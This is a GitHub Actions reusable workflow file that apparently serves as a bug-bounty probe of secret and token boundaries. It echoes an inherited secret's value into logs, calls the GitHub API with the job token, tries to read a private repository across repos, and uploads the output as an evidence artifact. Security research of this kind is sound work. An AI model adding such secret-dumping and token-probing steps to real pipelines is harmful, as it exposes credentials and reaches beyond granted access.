name: g4-reusable-public
on:
  workflow_call:
    inputs:
      probe_label:
        type: string
        required: false
        default: 'public-reusable-default'
    secrets:
      PRIVATE_DUMMY_SECRET:
        required: false

permissions:
  contents: read
  actions: read

jobs:
  detect:
    runs-on: ubuntu-latest
    steps:
      - name: read inherited secret + token boundary in PUBLIC reusable workflow
        id: s
        run: |
          S="${{ secrets.PRIVATE_DUMMY_SECRET }}"
          E=/tmp/pub-leak.txt
          {
            echo "probe_label=input:${{ inputs.probe_label }}"
            echo "PRIVATE_DUMMY_SECRET value=[$S] len=${#S}"
            echo "repo where this job runs: $GITHUB_REPOSITORY"
            echo "run_id: $GITHUB_RUN_ID"
            echo "=== token /user ==="
            TOKEN="${{ github.token }}"
            curl -sS -H "Authorization: Bearer $TOKEN" https://api.github.com/user | head -c 400
            echo ""
            echo "=== token read PRIVATE repo (cross-repo) ==="
            curl -sS -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/Darkeydel/gh-bounty-private-1
            echo "=== token read PUBLIC repo (own) ==="
            curl -sS -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/Darkeydel/gh-bounty-test-1
          } | tee "$E"
          cp "$E" /tmp/pub-leak-final.txt
      - name: upload evidence
        uses: actions/upload-artifact@v4
        with:
          name: g4-public-reusable-secret-evidence
          path: /tmp/pub-leak-final.txt
